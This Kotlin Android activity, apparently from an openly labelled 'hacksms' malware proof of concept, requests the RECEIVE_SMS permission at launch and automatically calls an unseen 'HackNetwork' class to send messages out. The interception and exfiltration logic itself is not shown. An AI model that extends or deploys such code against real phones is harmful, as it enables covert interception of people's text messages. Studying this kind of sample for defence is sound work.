package cocomelonc.hacksms

import android.Manifest
import android.os.Bundle
import android.content.Context
import androidx.activity.ComponentActivity
import android.widget.Button
import android.widget.Toast
import com.karumi.dexter.Dexter
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionDeniedResponse
import com.karumi.dexter.listener.PermissionGrantedResponse
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.single.PermissionListener

class HackMainActivity : ComponentActivity() {
    private lateinit var meowButton: Button
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        grantSmsReceivePermissions(this)
        meowButton = findViewById(R.id.meowButton)
        meowButton.setOnClickListener {
            Toast.makeText(
                applicationContext,
                "Meow! ♥\uFE0F",
                Toast.LENGTH_SHORT
            ).show()
            HackNetwork(this).sendTextMessage("\uD83D\uDCF1 Meow! ♥\uFE0F")
        }
        HackNetwork(this).sendTextMessage("Meow! ♥\uFE0F")
    }

    private fun grantSmsReceivePermissions(context: Context) {
        Dexter.withContext(context)
            .withPermission(Manifest.permission.RECEIVE_SMS)
            .withListener(object : PermissionListener {
                override fun onPermissionGranted(p0: PermissionGrantedResponse?) {
                    Toast.makeText(
                        context,
                        "Hack SMS permission granted",
                        Toast.LENGTH_SHORT
                    ).show()
                }
                override fun onPermissionDenied(p0: PermissionDeniedResponse?) {
                    Toast.makeText(
                        context,
                        "Hack SMS permission denied",
                        Toast.LENGTH_SHORT
                    ).show()
                }
                override fun onPermissionRationaleShouldBeShown(
                    p0: PermissionRequest?,
                    p1: PermissionToken?
                ) {
                }
            }).check()
    }
}